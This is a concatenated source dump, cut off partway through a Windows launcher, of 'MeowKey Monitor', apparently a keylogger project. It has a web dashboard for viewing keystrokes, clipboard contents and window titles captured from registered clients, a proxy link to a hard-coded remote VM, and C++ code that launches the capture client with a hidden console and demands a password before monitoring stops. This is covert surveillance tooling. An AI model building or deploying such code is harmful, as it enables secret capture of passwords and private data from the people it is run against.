        const processed = { ...response };
        
        // Ensure arrays exist even if empty
        if (dataType === 'all' || dataType === 'keystrokes') {
            if (!processed.keystrokes || !Array.isArray(processed.keystrokes)) {
                processed.keystrokes = [];
            }
        }
        
        if (dataType === 'all' || dataType === 'clipboard') {
            if (!processed.clipboard || !Array.isArray(processed.clipboard)) {
                processed.clipboard = [];
            }
        }
        
        if (dataType === 'all' || dataType === 'windows') {
            if (!processed.windows || !Array.isArray(processed.windows)) {
                processed.windows = [];
            }
        }
        
        return processed;
    }

    // Display query results
    displayQueryResults(clientId, dataType, response) {
        const resultsContainer = document.getElementById('query-results');
        if (!resultsContainer) return;
        
        let resultsHTML = `
            <div class="query-results-header">
                <h4>Results for ${clientId} (${dataType})</h4>
                <span class="results-count">
                    ${this.getResultsCount(response, dataType)} items found
                </span>
            </div>
        `;
        
        if (dataType === 'all' || dataType === 'keystrokes') {
            resultsHTML += this.formatQueryResults('Keystrokes', response.keystrokes || []);
        }
        
        if (dataType === 'all' || dataType === 'clipboard') {
            resultsHTML += this.formatQueryResults('Clipboard', response.clipboard || []);
        }
        
        if (dataType === 'all' || dataType === 'windows') {
            resultsHTML += this.formatQueryResults('Windows', response.windows || []);
        }
        
        resultsContainer.innerHTML = resultsHTML;
        this.utils.showNotification('Query completed successfully', 'success');
    }

    // Get results count
    getResultsCount(response, dataType) {
        let count = 0;
        if (dataType === 'all') {
            count += (response.keystrokes?.length || 0);
            count += (response.clipboard?.length || 0);
            count += (response.windows?.length || 0);
        } else if (dataType === 'keystrokes') {
            count = response.keystrokes?.length || 0;
        } else if (dataType === 'clipboard') {
            count = response.clipboard?.length || 0;
        } else if (dataType === 'windows') {
            count = response.windows?.length || 0;
        }
        return count;
    }

    // Format query results
    formatQueryResults(title, items) {
        if (!items.length) {
            return `
                <div class="result-section">
                    <h5>${title}</h5>
                    <div class="no-results">No ${title.toLowerCase()} found</div>
                </div>
            `;
        }
        
        let html = `
            <div class="result-section">
                <h5>${title} (${items.length})</h5>
                <div class="result-list">
        `;
        
        items.slice(0, 50).forEach((item, index) => {
            const time = item.displayTime || this.utils.formatMicroTimestamp(item.timestamp);
            
            if (title === 'Keystrokes') {
                html += `
                    <div class="result-item">
                        <span class="result-index">${index + 1}.</span>
                        <span class="result-time">[${time}]</span>
                        <span class="result-content">${this.escapeHtml(item.key || 'Unknown')}</span>
                    </div>
                `;
            } else if (title === 'Clipboard') {
                const content = item.content || 'Empty';
                const displayContent = content.length > 100 ? content.substring(0, 100) + '...' : content;
                html += `
                    <div class="result-item">
                        <span class="result-index">${index + 1}.</span>
                        <span class="result-time">[${time}]</span>
                        <span class="result-content" title="${this.escapeHtml(content)}">${this.escapeHtml(displayContent)}</span>
                    </div>
                `;
            } else if (title === 'Windows') {
                html += `
                    <div class="result-item">
                        <span class="result-index">${index + 1}.</span>
                        <span class="result-time">[${time}]</span>
                        <div class="result-content">
                            <div>${this.escapeHtml(item.title || 'Unknown')}</div>
                            <div class="result-process">${this.escapeHtml(item.process || 'Unknown')}</div>
                        </div>
                    </div>
                `;
            }
        });
        
        if (items.length > 50) {
            html += `<div class="result-more">... and ${items.length - 50} more items</div>`;
        }
        
        html += `
                </div>
            </div>
        `;
        
        return html;
    }

    // Utility function to escape HTML
    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    // Cleanup
    destroy() {
        this.stopAutoRefresh();
        this.stopLiveUpdates();
        
        // Clear all monitoring intervals
        this.activeClients.forEach((client, clientId) => {
            if (client.monitorInterval) {
                clearInterval(client.monitorInterval);
            }
        });
        
        console.log('ðŸ§¹ Dashboard cleanup complete');
    }
}

// Add CSS for live streaming
const liveStreamStyles = document.createElement('style');
liveStreamStyles.textContent = `
    /* Live streaming styles */
    .live-indicator {
        display: flex;
        align-items: center;
        gap: 0.25rem;
        margin-top: 0.25rem;
    }
    
    .live-dot {
        width: 6px;
        height: 6px;
        border-radius: 50%;
        background: #34a853;
        animation: pulse 1.5s infinite;
    }
    
    @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.3; }
    }
    
    .live-text {
        font-size: 0.7rem;
        font-weight: 600;
        color: #34a853;
        text-transform: uppercase;
        letter-spacing: 0.05em;
    }
    
    .section-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 0.75rem;
    }
    
    .live-counter {
        font-size: 0.75rem;
        font-weight: 600;
        color: #1a73e8;
        background: #e8f0fe;
        padding: 0.125rem 0.5rem;
        border-radius: 12px;
        min-width: 24px;
        text-align: center;
    }
    
    .live-stream {
        min-height: 120px;
        max-height: 150px;
        overflow-y: auto;
    }
    
    .live-placeholder {
        color: #80868b;
        font-style: italic;
        text-align: center;
        padding: 2rem 1rem;
    }
    
    /* Keystroke animation */
    .new-keystroke {
        animation: slideIn 0.3s ease;
        background: #e8f0fe !important;
        transform-origin: left center;
    }
    
    @keyframes slideIn {
        from {
            opacity: 0;
            transform: translateX(-20px) scale(0.8);
        }
        to {
            opacity: 1;
            transform: translateX(0) scale(1);
        }
    }
    
    /* Query Section Styles */
    .query-form {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 1rem;
        margin-bottom: 1.5rem;
        padding: 1rem;
        background: #f8f9fa;
        border-radius: 6px;
        border: 1px solid #e0e0e0;
    }
    
    .form-group {
        display: flex;
        flex-direction: column;
        gap: 0.5rem;
    }
    
    .form-group label {
        font-size: 0.875rem;
        font-weight: 500;
        color: #5f6368;
    }
    
    .form-group select,
    .form-group input {
        padding: 0.5rem;
        border: 1px solid #dadce0;
        border-radius: 4px;
        font-size: 0.875rem;
        background: white;
    }
    
    .query-results {
        background: white;
        border: 1px solid #e0e0e0;
        border-radius: 8px;
        padding: 1.5rem;
        max-height: 400px;
        overflow-y: auto;
    }
    
    .empty-results {
        text-align: center;
        padding: 2rem;
        color: #5f6368;
    }
    
    .empty-results i {
        font-size: 3rem;
        color: #dadce0;
        margin-bottom: 1rem;
    }
    
    .query-results-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 1rem;
        padding-bottom: 1rem;
        border-bottom: 1px solid #e0e0e0;
    }
    
    .query-results-header h4 {
        margin: 0;
        font-size: 1rem;
        color: #202124;
    }
    
    .results-count {
        font-size: 0.875rem;
        color: #1a73e8;
        font-weight: 500;
    }
    
    .result-section {
        margin-bottom: 1.5rem;
    }
    
    .result-section:last-child {
        margin-bottom: 0;
    }
    
    .result-section h5 {
        font-size: 0.875rem;
        font-weight: 600;
        color: #5f6368;
        margin: 0 0 0.75rem 0;
        text-transform: uppercase;
        letter-spacing: 0.05em;
    }
    
    .result-list {
        display: flex;
        flex-direction: column;
        gap: 0.5rem;
    }
    
    .result-item {
        display: flex;
        align-items: flex-start;
        gap: 0.5rem;
        padding: 0.5rem;
        background: #f8f9fa;
        border-radius: 4px;
        border: 1px solid #e0e0e0;
        font-size: 0.875rem;
    }
    
    .result-index {
        color: #5f6368;
        min-width: 2rem;
        flex-shrink: 0;
    }
    
    .result-time {
        color: #80868b;
        font-size: 0.75rem;
        min-width: 6rem;
        flex-shrink: 0;
    }
    
    .result-content {
        flex: 1;
        word-break: break-all;
    }
    
    .result-process {
        font-size: 0.75rem;
        color: #5f6368;
        font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
    }
    
    .result-more {
        text-align: center;
        padding: 0.5rem;
        color: #5f6368;
        font-size: 0.75rem;
        font-style: italic;
    }
    
    .no-results {
        padding: 1rem;
        text-align: center;
        color: #5f6368;
        background: #f8f9fa;
        border-radius: 4px;
        border: 1px dashed #e0e0e0;
    }
    
    /* Data Modal Styles */
    .data-summary {
        display: flex;
        gap: 1rem;
        margin-bottom: 1rem;
        padding-bottom: 1rem;
        border-bottom: 1px solid #e0e0e0;
    }
    
    .summary-item {
        display: flex;
        align-items: center;
        gap: 0.5rem;
        padding: 0.5rem 1rem;
        background: #f8f9fa;
        border-radius: 4px;
        border: 1px solid #e0e0e0;
    }
    
    .summary-item i {
        color: #1a73e8;
    }
    
    .data-tabs {
        display: flex;
        gap: 0.5rem;
        margin-bottom: 1rem;
        border-bottom: 1px solid #e0e0e0;
        padding-bottom: 0.5rem;
    }
    
    .tab-btn {
        padding: 0.5rem 1rem;
        background: none;
        border: none;
        color: #5f6368;
        font-size: 0.875rem;
        cursor: pointer;
        border-radius: 4px;
        transition: all 0.2s ease;
    }
    
    .tab-btn:hover {
        background: #f8f9fa;
        color: #202124;
    }
    
    .tab-btn.active {
        background: #1a73e8;
        color: white;
    }
    
    .data-list {
        max-height: 300px;
        overflow-y: auto;
    }
    
    .data-item {
        display: flex;
        align-items: flex-start;
        gap: 0.5rem;
        padding: 0.75rem;
        border-bottom: 1px solid #f0f0f0;
    }
    
    .data-item:last-child {
        border-bottom: none;
    }
    
    .data-item:hover {
        background: #f8f9fa;
    }
    
    .data-index {
        color: #5f6368;
        min-width: 2rem;
        flex-shrink: 0;
    }
    
    .data-time {
        color: #80868b;
        font-size: 0.75rem;
        min-width: 6rem;
        flex-shrink: 0;
    }
    
    .data-content {
        flex: 1;
        word-break: break-all;
    }
    
    .clipboard-item .data-content {
        white-space: pre-wrap;
        font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
        font-size: 0.8125rem;
        background: #f8f9fa;
        padding: 0.5rem;
        border-radius: 4px;
        border: 1px solid #e0e0e0;
    }
    
    .window-item .window-title {
        font-weight: 500;
        margin-bottom: 0.25rem;
    }
    
    .window-item .window-process {
        font-size: 0.75rem;
        color: #5f6368;
        font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
    }
    
    /* Loading states */
    .loading-keystrokes,
    .loading-windows,
    .loading-clipboard,
    .no-data {
        padding: 1rem;
        text-align: center;
        color: #5f6368;
        font-style: italic;
    }
    
    /* Disconnect button spacing */
    .client-status {
        display: flex;
        align-items: center;
        gap: 0.75rem;
        flex-wrap: wrap;
    }
`;
document.head.appendChild(liveStreamStyles);

// Initialize dashboard
document.addEventListener('DOMContentLoaded', () => {
    if (window.location.pathname.includes('index.html') || window.location.pathname === '/') {
        window.dashboard = new Dashboard();
        window.dashboard.init();
        
        // Cleanup on page unload
        window.addEventListener('beforeunload', () => {
            if (window.dashboard) {
                window.dashboard.destroy();
            }
        });
    }
});

===== FILE: ./UI/js/utils.js =====



// class Utils {
//     constructor() {
//         this.serverUrl = 'http://localhost:3000';
//     }

//     formatTimestamp(timestamp) {
//         if (!timestamp) return 'Just now';
        
//         const date = new Date(timestamp);
//         const now = new Date();
//         const diffMs = now - date;
//         const diffMins = Math.floor(diffMs / 60000);
//         const diffHours = Math.floor(diffMs / 3600000);
//         const diffDays = Math.floor(diffMs / 86400000);

//         if (diffMins < 1) return 'Just now';
//         if (diffMins < 60) return `${diffMins}m ago`;
//         if (diffHours < 24) return `${diffHours}h ago`;
//         if (diffDays < 7) return `${diffDays}d ago`;
        
//         return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
//     }

//     formatMicroTimestamp(microseconds) {
//         if (!microseconds) return 'Unknown';
//         // Convert microseconds to milliseconds
//         const date = new Date(microseconds / 1000);
//         return this.formatTimestamp(date.getTime());
//     }

//     getClientColor(clientId) {
//         const colors = [
//             '#1a73e8', '#34a853', '#f9ab00', '#e52592',
//             '#d93025', '#9334e6', '#00bcd4', '#ff6d00'
//         ];
        
//         let hash = 0;
//         for (let i = 0; i < clientId.length; i++) {
//             hash = clientId.charCodeAt(i) + ((hash << 5) - hash);
//         }
        
//         return colors[Math.abs(hash) % colors.length];
//     }

//     getClientInitials(clientId) {
//         const parts = clientId.split(/[_-]/);
//         if (parts.length >= 2) {
//             return (parts[0][0] + parts[1][0]).toUpperCase();
//         }
//         return clientId.substring(0, 2).toUpperCase();
//     }

//     updateCurrentTime() {
//         const timeElement = document.getElementById('current-time');
//         if (timeElement) {
//             const now = new Date();
//             timeElement.textContent = now.toLocaleString('en-US', {
//                 weekday: 'long',
//                 year: 'numeric',
//                 month: 'long',
//                 day: 'numeric',
//                 hour: '2-digit',
//                 minute: '2-digit',
//                 second: '2-digit',
//                 hour12: true
//             });
//         }
//     }

//     showNotification(message, type = 'info') {
//         const notification = document.createElement('div');
//         notification.className = `notification notification-${type}`;
//         notification.innerHTML = `
//             <div class="notification-content">
//                 <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
//                 <span>${message}</span>
//             </div>
//             <button class="notification-close">&times;</button>
//         `;
        
//         document.body.appendChild(notification);
        
//         setTimeout(() => {
//             if (notification.parentNode) {
//                 notification.remove();
//             }
//         }, 5000);
        
//         notification.querySelector('.notification-close').addEventListener('click', () => {
//             notification.remove();
//         });
//     }

//     showModal(modalId) {
//         const modal = document.getElementById(modalId);
//         if (modal) {
//             modal.classList.add('show');
//             document.body.style.overflow = 'hidden';
//         }
//     }

//     hideModal(modalId) {
//         const modal = document.getElementById(modalId);
//         if (modal) {
//             modal.classList.remove('show');
//             document.body.style.overflow = '';
//         }
//     }

//     // In the apiCall method of UI/js/utils.js, update error handling:
// async apiCall(endpoint, method = 'GET', data = null) {
//     try {
//         const options = {
//             method,
//             headers: {
//                 'Content-Type': 'application/json',
//             },
//         };

//         if (data && (method === 'POST' || method === 'PUT' || method === 'DELETE')) {
//             options.body = JSON.stringify(data);
//         }

//         const response = await fetch(`${this.serverUrl}${endpoint}`, options);
        
//         if (!response.ok) {
//             const errorText = await response.text();
//             throw new Error(`API error ${response.status}: ${errorText}`);
//         }

//         return await response.json(); 
//     } catch (error) {
//         console.error('API call failed:', error);
//         // Show more specific error message
//         if (error.message.includes('Failed to fetch')) {
//             this.showNotification('Cannot connect to UI server. Make sure it\'s running on port 3000', 'error');
//         } else if (error.message.includes('Connection error')) {
//             this.showNotification('Cannot connect to C++ server API', 'error');
//         } else {
//             this.showNotification('Connection failed: ' + error.message, 'error');
//         }
//         throw error;
//     }
// }
    
//     classifyKeystroke(key) {
//         if (!key) return 'normal';
//         if (key.length === 1) return 'normal';
//         if (key.includes('Ctrl') || key.includes('Alt') || key.includes('Shift') || key.includes('Cmd')) return 'modifier';
//         if (key.includes('Enter') || key.includes('Tab') || key.includes('Space') || key.includes('Backspace')) return 'special';
//         if (key.includes('Arrow') || key.includes('Page') || key.includes('Home') || key.includes('End')) return 'navigation';
//         if (key.includes('F') && key.length <= 3) return 'function';
//         return 'normal';
//     }
// }

// // Initialize
// document.addEventListener('DOMContentLoaded', () => {
//     window.utils = new Utils();
//     window.utils.updateCurrentTime();
    
//     // Update time every second
//     setInterval(() => {
//         window.utils.updateCurrentTime();
//     }, 1000);
    
//     // Close modal when clicking X
//     document.addEventListener('click', (e) => {
//         if (e.target.classList.contains('close-modal')) {
//             const modal = e.target.closest('.modal');
//             if (modal) {
//                 window.utils.hideModal(modal.id);
//             }
//         }
//     });
    
//     // Close modal when clicking outside
//     document.addEventListener('click', (e) => {
//         if (e.target.classList.contains('modal')) {
//             window.utils.hideModal(e.target.id);
//         }
//     });
    
//     // Escape key closes modals
//     document.addEventListener('keydown', (e) => {
//         if (e.key === 'Escape') {
//             document.querySelectorAll('.modal.show').forEach(modal => {
//                 window.utils.hideModal(modal.id);
//             });
//         }
//     });
// });

// // Notification styles
// const style = document.createElement('style');
// style.textContent = `
//     .notification {
//         position: fixed;
//         top: 20px;
//         right: 20px;
//         background: white;
//         border-radius: 6px;
//         box-shadow: 0 4px 12px rgba(0,0,0,0.15);
//         padding: 1rem;
//         display: flex;
//         align-items: center;
//         justify-content: space-between;
//         min-width: 300px;
//         max-width: 400px;
//         z-index: 1000;
//         animation: slideIn 0.3s ease;
//         border-left: 4px solid #1a73e8;
//     }
    
//     .notification-success { border-left-color: #34a853; }
//     .notification-error { border-left-color: #d93025; }
//     .notification-info { border-left-color: #1a73e8; }
    
//     .notification-content {
//         display: flex;
//         align-items: center;
//         gap: 0.75rem;
//         flex: 1;
//     }
    
//     .notification-content i { 
//         font-size: 1.25rem; 
//         flex-shrink: 0;
//     }
//     .notification-success .notification-content i { color: #34a853; }
//     .notification-error .notification-content i { color: #d93025; }
//     .notification-info .notification-content i { color: #1a73e8; }
    
//     .notification-content span {
//         flex: 1;
//         word-break: break-word;
//     }
    
//     .notification-close {
//         background: none;
//         border: none;
//         font-size: 1.25rem;
//         color: #5f6368;
//         cursor: pointer;
//         padding: 0.25rem;
//         line-height: 1;
//         margin-left: 0.5rem;
//         flex-shrink: 0;
//     }
    
//     .notification-close:hover { color: #d93025; }
    
//     @keyframes slideIn {
//         from {
//             transform: translateX(100%);
//             opacity: 0;
//         }
//         to {
//             transform: translateX(0);
//             opacity: 1;
//         }
//     }
// `;
// document.head.appendChild(style);




// UI/js/utils.js - AWS DEPLOYMENT VERSION
class Utils {
    constructor() {
        // âœ… Connect to LOCAL Node.js proxy (running on your machine)
        this.apiServerHost = 'localhost';  // Local Node.js
        this.apiServerPort = 3000;         // Node.js port
        this.serverUrl = `http://${this.apiServerHost}:${this.apiServerPort}`;
        
        console.log(`ðŸ“¡ Connecting to LOCAL Node.js proxy: ${this.serverUrl}`);
        console.log(`   (which connects to VM at 13.48.25.178:3002)`);
    }

   

    formatTimestamp(timestamp) {
        if (!timestamp) return 'Just now';
        
        const date = new Date(timestamp);
        const now = new Date();
        const diffMs = now - date;
        const diffMins = Math.floor(diffMs / 60000);
        const diffHours = Math.floor(diffMs / 3600000);
        const diffDays = Math.floor(diffMs / 86400000);

        if (diffMins < 1) return 'Just now';
        if (diffMins < 60) return `${diffMins}m ago`;
        if (diffHours < 24) return `${diffHours}h ago`;
        if (diffDays < 7) return `${diffDays}d ago`;
        
        return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
    }

    formatMicroTimestamp(microseconds) {
        if (!microseconds) return 'Unknown';
        const date = new Date(microseconds / 1000);
        return this.formatTimestamp(date.getTime());
    }

    getClientColor(clientId) {
        const colors = [
            '#1a73e8', '#34a853', '#f9ab00', '#e52592',
            '#d93025', '#9334e6', '#00bcd4', '#ff6d00'
        ];
        
        let hash = 0;
        for (let i = 0; i < clientId.length; i++) {
            hash = clientId.charCodeAt(i) + ((hash << 5) - hash);
        }
        
        return colors[Math.abs(hash) % colors.length];
    }

    getClientInitials(clientId) {
        const parts = clientId.split(/[_-]/);
        if (parts.length >= 2) {
            return (parts[0][0] + parts[1][0]).toUpperCase();
        }
        return clientId.substring(0, 2).toUpperCase();
    }

    updateCurrentTime() {
        const timeElement = document.getElementById('current-time');
        if (timeElement) {
            const now = new Date();
            timeElement.textContent = now.toLocaleString('en-US', {
                weekday: 'long',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: true
            });
        }
    }

    showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
                <span>${message}</span>
            </div>
            <button class="notification-close">&times;</button>
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
        
        notification.querySelector('.notification-close').addEventListener('click', () => {
            notification.remove();
        });
    }

    showModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.classList.add('show');
            document.body.style.overflow = 'hidden';
        }
    }

    hideModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.classList.remove('show');
            document.body.style.overflow = '';
        }
    }

    async apiCall(endpoint, method = 'GET', data = null) {
        try {
            const options = {
                method,
                headers: {
                    'Content-Type': 'application/json',
                },
            };

            if (data && (method === 'POST' || method === 'PUT' || method === 'DELETE')) {
                options.body = JSON.stringify(data);
            }

            const response = await fetch(`${this.serverUrl}${endpoint}`, options);
            
            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`API error ${response.status}: ${errorText}`);
            }

            return await response.json(); 
        } catch (error) {
            console.error('API call failed:', error);
            if (error.message.includes('Failed to fetch')) {
                this.showNotification(`Cannot connect to server at ${this.apiServerHost}:${this.apiServerPort}`, 'error');
            } else {
                this.showNotification('Connection failed: ' + error.message, 'error');
            }
            throw error;
        }
    }
    
    classifyKeystroke(key) {
        if (!key) return 'normal';
        if (key.length === 1) return 'normal';
        if (key.includes('Ctrl') || key.includes('Alt') || key.includes('Shift') || key.includes('Cmd')) return 'modifier';
        if (key.includes('Enter') || key.includes('Tab') || key.includes('Space') || key.includes('Backspace')) return 'special';
        if (key.includes('Arrow') || key.includes('Page') || key.includes('Home') || key.includes('End')) return 'navigation';
        if (key.includes('F') && key.length <= 3) return 'function';
        return 'normal';
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    window.utils = new Utils();
    window.utils.updateCurrentTime();
    
    setInterval(() => {
        window.utils.updateCurrentTime();
    }, 1000);
    
    document.addEventListener('click', (e) => {
        if (e.target.classList.contains('close-modal')) {
            const modal = e.target.closest('.modal');
            if (modal) {
                window.utils.hideModal(modal.id);
            }
        }
    });
    
    document.addEventListener('click', (e) => {
        if (e.target.classList.contains('modal')) {
            window.utils.hideModal(e.target.id);
        }
    });
    
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            document.querySelectorAll('.modal.show').forEach(modal => {
                window.utils.hideModal(modal.id);
            });
        }
    });
});


===== FILE: ./UI/clients.html =====

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Client Management - MeowKey Monitor</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <div class="logo">
                <h1>MeowKey Monitor</h1>
                <p class="subtitle">Client Management</p>
            </div>
            <nav class="nav">
                <a href="index.html" class="nav-link"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
                <a href="waiting_room.html" class="nav-link"><i class="fas fa-user-clock"></i> Waiting Room</a>
                <a href="clients.html" class="nav-link active"><i class="fas fa-users"></i> Clients</a>
                <a href="settings.html" class="nav-link"><i class="fas fa-cog"></i> Settings</a>
                <div class="status-indicator">
                    <span class="status-dot active"></span>
                    <span class="status-text">Server: Online</span>
                </div>
            </nav>
        </header>

        <!-- Main Content -->
        <main class="main-content">
            <div class="dashboard-header">
                <h2>All Registered Clients</h2>
                <div class="stats-summary">
                    <div class="stat-card">
                        <span class="stat-value" id="total-registered">0</span>
                        <span class="stat-label">Total Registered</span>
                    </div>
                    <div class="stat-card">
                        <span class="stat-value" id="active-now">0</span>
                        <span class="stat-label">Currently Active</span>
                    </div>
                    <div class="stat-card">
                        <span class="stat-value" id="inactive-clients">0</span>
                        <span class="stat-label">Inactive</span>
                    </div>
                </div>
            </div>

            <!-- Client Management Controls -->
            <div class="settings-card" style="margin-bottom: 1.5rem;">
                <h3>Client Actions</h3>
                <div style="display: flex; gap: 1rem; margin-top: 1rem;">
                    <button class="btn-secondary" id="refresh-clients">
                        <i class="fas fa-sync-alt"></i> Refresh List
                    </button>
                    <button class="btn-secondary" id="export-data">
                        <i class="fas fa-download"></i> Export Client Data
                    </button>
                    <button class="btn-secondary" id="view-statistics">
                        <i class="fas fa-chart-bar"></i> View Statistics
                    </button>
                </div>
            </div>

            <!-- Clients Table -->
            <div class="pending-clients">
                <div class="client-header" style="background: #f8f9fa;">
                    <div style="display: grid; grid-template-columns: 2fr 1fr 1fr 1fr 1fr; gap: 1rem; width: 100%;">
                        <span style="font-weight: 600;">Client ID</span>
                        <span style="font-weight: 600;">Status</span>
                        <span style="font-weight: 600;">Sessions</span>
                        <span style="font-weight: 600;">Last Active</span>
                        <span style="font-weight: 600;">Actions</span>
                    </div>
                </div>
                
                <div id="clients-table">
                    <!-- Clients will be dynamically inserted here -->
                    <div class="empty-state" style="border: none; padding: 2rem;">
                        <i class="fas fa-users"></i>
                        <h3>No Clients Found</h3>
                        <p>No clients have registered with the server yet</p>
                    </div>
                </div>
            </div>

            <!-- Client Details Modal -->
            <div class="modal" id="client-details-modal">
                <div class="modal-content">
                    <div class="modal-header">
                        <h3 id="client-details-title">Client Details</h3>
                        <button class="close-modal" id="close-details-modal">&times;</button>
                    </div>
                    <div class="modal-body">
                        <div class="settings-grid">
                            <div class="settings-card">
                                <h3>Basic Information</h3>
                                <div class="statistics-grid">
                                    <div class="stat-row">
                                        <span>Client ID</span>
                                        <span id="detail-client-id" class="text-muted">-</span>
                                    </div>
                                    <div class="stat-row">
                                        <span>Client Hash</span>
                                        <span id="detail-client-hash" class="text-muted">-</span>
                                    </div>
                                    <div class="stat-row">
                                        <span>First Seen</span>
                                        <span id="detail-first-seen" class="text-muted">-</span>
                                    </div>
                                    <div class="stat-row">
                                        <span>Last Seen</span>
                                        <span id="detail-last-seen" class="text-muted">-</span>
                                    </div>
                                </div>
                            </div>
                            <div class="settings-card">
                                <h3>Activity Statistics</h3>
                                <div class="statistics-grid">
                                    <div class="stat-row">
                                        <span>Total Sessions</span>
                                        <span id="detail-session-count" class="text-muted">0</span>
                                    </div>
                                    <div class="stat-row">
                                        <span>Keystrokes</span>
                                        <span id="detail-keystrokes" class="text-muted">0</span>
                                    </div>
                                    <div class="stat-row">
                                        <span>Clipboard Events</span>
                                        <span id="detail-clipboard" class="text-muted">0</span>
                                    </div>
                                    <div class="stat-row">
                                        <span>Window Events</span>
                                        <span id="detail-windows" class="text-muted">0</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="settings-card" style="margin-top: 1.5rem;">
                            <h3>Data Management</h3>
                            <div style="display: flex; gap: 1rem; margin-top: 1rem;">
                                <button class="btn-secondary" id="view-client-data">
                                    <i class="fas fa-eye"></i> View All Data
                                </button>
                                <button class="btn-danger" id="delete-client-data">
                                    <i class="fas fa-trash"></i> Delete Client Data
                                </button>
                                <button class="btn-danger" id="kick-client">
                                    <i class="fas fa-sign-out-alt"></i> Kick Client
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="footer">
            <p>MeowKey Monitoring System v1.0 | Secure Connection Established</p>
            <p class="timestamp" id="current-time"></p>
        </footer>
    </div>

    <script src="js/utils.js"></script>
    <script src="js/main.js"></script>
</body>
</html>

===== FILE: ./password_dialog_windows.hpp =====

#ifndef PASSWORD_DIALOG_WINDOWS_HPP
#define PASSWORD_DIALOG_WINDOWS_HPP

#ifdef PLATFORM_WINDOWS

#include <windows.h>
#include <string>
#include <iostream>
#include <conio.h>
#include "launcher_common.hpp"
using namespace std; 
class PasswordDialogWindows {
public:
    static bool showPasswordDialog() {
          cout << "\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" <<   endl;
          cout << "â•‘  EXIT AUTHORIZATION REQUIRED          â•‘" <<   endl;
          cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" <<   endl;
          cout << "Enter password to stop monitoring: ";
        
          string password = getPasswordInput();
          cout <<   endl;
        
        return verifyPassword(password);
    }
    
private:
    static   string getPasswordInput() {
          string password;
        char ch;
        
        while (true) {
            ch = _getch();
            
            if (ch == '\r' || ch == '\n') { // Enter key
                break;
            } else if (ch == '\b' || ch == 127) { // Backspace
                if (!password.empty()) {
                    password.pop_back();
                      cout << "\b \b"; // Erase character from display
                }
            } else if (ch >= 32 && ch <= 126) { // Printable characters only
                password += ch;
                  cout << '*'; // Show asterisk
            }
        }
        
        return password;
    }
};

#endif // PLATFORM_WINDOWS
#endif

===== FILE: ./code.txt =====



===== FILE: ./launcher_windows_simple.cpp =====




#include "platform_detector.hpp"

#ifdef PLATFORM_WINDOWS

#include <windows.h>
#include <iostream>
#include <string>
#include <atomic>
#include <thread>
#include <conio.h>
#include "launcher_common.hpp"
#include "password_dialog_windows.hpp"
using namespace std; 
  atomic<bool> exit_authorized(false);
  atomic<bool> monitoring(true);
PROCESS_INFORMATION clientProcess = {0};

bool launchClientHidden(const   string& exe, const   string& args) {
      string cmdLine = exe + " " + args;
    char* cmdBuffer = new char[cmdLine.length() + 1];
    strcpy_s(cmdBuffer, cmdLine.length() + 1, cmdLine.c_str());
    
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // HIDE the client console
    
    BOOL success = CreateProcessA(
        NULL, cmdBuffer,
        NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE | CREATE_NO_WINDOW,  // Hidden console
        NULL, NULL, &si, &clientProcess
    );
    
    delete[] cmdBuffer;
    return success == TRUE;
}

void inputThread() {
      cout << "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”" <<   endl;
      cout << "COMMANDS:" <<   endl;
      cout << "  exit   - Stop monitoring (requires password)" <<   endl;
      cout << "  status - Check client status" <<   endl;
      cout << "  show   - Show client console (if hidden)" <<   endl;
      cout << "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n" <<   endl;
    
      string input;
    while (monitoring) {
          cout << "> ";
          getline(  cin, input);
        
        if (input == "exit" || input == "quit") {
